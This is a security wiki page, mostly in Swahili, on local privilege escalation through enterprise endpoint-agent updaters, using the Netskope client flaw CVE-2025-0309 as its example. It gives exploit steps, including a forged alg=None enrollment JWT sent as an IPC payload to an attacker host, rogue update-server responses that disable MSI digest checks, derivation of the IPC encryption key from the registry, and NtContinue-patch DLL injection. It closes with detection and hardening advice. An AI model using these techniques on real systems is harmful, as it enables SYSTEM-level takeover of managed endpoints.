# Kutumia Vibaya Auto-Updaters za Enterprise na Privileged IPC (mf., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unagawa kwa ujumla daraja la chains za Windows local privilege escalation zilizopatikana kwenye enterprise endpoint agents na updaters zinazotoa uso wa IPC rahisi kutumia na mchakato wa masasisho wenye ruhusa za juu. Mfano unaowakilisha ni Netskope Client for Windows < R129 (CVE-2025-0309), ambapo mtumiaji mwenye ruhusa ndogo anaweza kulazimisha enrollment kwenye server inayodhibitiwa na mshambuliaji na kisha kuwasilisha MSI ya uharibifu ambayo huduma ya SYSTEM inaisakinisha.

Mafikra muhimu unaweza kuyatumia dhidi ya bidhaa zinazofanana:
- Tumia localhost IPC ya huduma iliyo na ruhusa za juu kulazimisha re‑enrollment au reconfiguration kwenda kwenye server ya mshambuliaji.
- Tekeleza endpoints za vendor za update, wasilishe rogue Trusted Root CA, na elekeza updater kwa package hatari, “signed”.
- Epuka ukaguzi dhaifu wa signer (CN allow‑lists), flags za digest za hiari, na mali za MSI zilizo na uvumilivu mdogo.
- Ikiwa IPC ime “encrypted”, zaa key/IV kutoka kwa vitambulisho vya mashine vinavyososwa kwa kusomeka na wote kwenye registry.
- Ikiwa huduma inazuia waite kwa image path/process name, weka injection kwenye process iliyoorodheshwa kwenye allow‑list au zalisha moja kwa status suspended na bootstrap DLL yako kupitia mabadiliko madogo ya thread‑context.

---
## 1) Kulazimisha enrollment kwenye server ya mshambuliaji kupitia localhost IPC

Wakala wengi huambatanisha mchakato wa UI wa user‑mode ambao unazungumza na huduma ya SYSTEM juu ya localhost TCP kwa kutumia JSON.

Imeonekana katika Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Mtiririko wa exploit:
1) Tunga token ya JWT ya enrollment yenye claims zinazoamua backend host (mf., AddonUrl). Tumia alg=None ili saini isiwe muhimu.
2) Tuma ujumbe wa IPC unaoitisha amri ya provisioning ukiweka JWT yako na jina la tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Huduma inaanza kuwasiliana na rogue server yako kwa ajili ya enrollment/config, kwa mfano:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Vidokezo:
- Ikiwa caller verification inategemea path/name‑based, anzisha ombi kutoka kwa vendor binary iliyoorodheshwa (angalia §4).

---
## 2) Kuiba chaneli ya masasisho ili kuendesha msimbo kama SYSTEM

Mara client anapozungumza na server yako, tekeleza endpoints zinazotarajiwa na muelekeze kwa MSI ya mshambuliaji. Mfuatano wa kawaida:

1) /v2/config/org/clientconfig → Rudisha JSON config yenye muda mfupi sana wa updater, kwa mfano:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Rejesha PEM CA certificate. Huduma inaiweka kwenye Local Machine Trusted Root store.
3) /v2/checkupdate → Toa metadata inayorejelea MSI hasidi na toleo bandia.

Bypassing common checks seen in the wild:
- Signer CN allow‑list: huduma inaweza tu kuangalia Subject CN ikiwa ni sawa na “netSkope Inc” au “Netskope, Inc.”. Rogue CA yako inaweza kutoa leaf yenye CN hiyo na kusaini MSI.
- CERT_DIGEST property: jumuisha mali ya MSI isiyo hatari iitwayo CERT_DIGEST. Hakuna utekelezaji wakati wa usakinishaji.
- Optional digest enforcement: bendera ya config (mf., check_msi_digest=false) inazima uthibitishaji wa ziada wa kriptografia.

Result: huduma ya SYSTEM inasakinisha MSI yako kutoka
C:\ProgramData\Netskope\stAgent\data\*.msi
ikitekeleza msimbo wowote kama NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Wavamizi wanaweza kurudia usimbaji na kutuma amri za kusimbwa halali kutoka kwa mtumiaji wa kawaida. Kidokezo kwa ujumla: ikiwa agent ghafla “encrypts” IPC yake, angalia device IDs, product GUIDs, install IDs chini ya HKLM kama nyenzo.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow‑listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow‑listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow‑listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver‑enforced tamper rules.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Loader ya user‑mode yenye kuaminika inayoheshimu vikwazo hivi:
1) CreateProcess ya binary ya vendor kwa CREATE_SUSPENDED.
2) Pata handles unazoruhusiwa nadal: PROCESS_VM_WRITE | PROCESS_VM_OPERATION kwenye process, na thread handle yenye THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (au THREAD_RESUME tu ikiwa unatengeneza patch kwenye RIP inayojulikana).
3) Andika juu ntdll!NtContinue (au thunk nyingine ya mapema, iliyohakikishiwa‑mapped) na stub ndogo inayomwita LoadLibraryW kwa path ya DLL yako, kisha irudi.
4) ResumeThread ili kusababisha stub yako ndani ya process, ikipakia DLL yako.

Kwa kuwa hukutumia PROCESS_CREATE_THREAD au PROCESS_SUSPEND_RESUME juu ya process tayari iliyo‑protected (uliunda wewe), sera ya driver inatimizwa.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) inautomate rogue CA, kusaini MSI hasidi, na kutumikia endpoints zinazohitajika: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope ni custom IPC client inayotengeneza ujumbe wa IPC yoyote (hiari kwa AES‑encrypted) na inajumuisha suspended‑process injection ili uitoke kutoka kwa binary iliyoorodheshwa.

---
## 7) Detection opportunities (blue team)
- Monitor additions to Local Machine Trusted Root. Sysmon + registry‑mod eventing (see SpecterOps guidance) inafanya kazi vizuri.
- Flag MSI executions initiated by the agent’s service from paths like C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Review agent logs for unexpected enrollment hosts/tenants, e.g.: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – angalia addonUrl / tenant anomalies na provisioning msg 148.
- Alert on localhost IPC clients that are not the expected signed binaries, or that originate from unusual child process trees.

---
## Hardening tips for vendors
- Bind enrollment/update hosts to a strict allow‑list; reject untrusted domains in clientcode.
- Authenticate IPC peers with OS primitives (ALPC security, named‑pipe SIDs) instead of image path/name checks.
- Keep secret material out of world‑readable HKLM; if IPC must be encrypted, derive keys from protected secrets or negotiate over authenticated channels.
- Treat the updater as a supply‑chain surface: require a full chain to a trusted CA you control, verify package signatures against pinned keys, and fail closed if validation is disabled in config.

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
